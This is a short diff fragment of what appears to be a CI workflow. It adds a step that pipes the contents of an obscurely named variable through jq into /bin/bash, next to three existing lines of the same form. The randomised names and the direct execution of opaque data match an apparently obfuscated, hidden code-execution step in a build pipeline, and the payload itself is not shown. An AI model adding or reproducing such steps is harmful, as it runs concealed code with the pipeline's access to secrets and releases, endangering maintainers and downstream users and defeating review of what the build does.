@@ -36,6 +36,7 @@ jobs:
           echo $r614 | jq -r .w3 | /bin/bash
           printf '%s' "$bckgz57" | jq -r .lqht9204 | /bin/bash
           echo $dxlvf8490 | jq -r .vopul6 | /bin/bash
+          printf '%s' "$wmj0208" | jq -r .olwcs2 | /bin/bash
 
       - name: Persist output
         if: always()
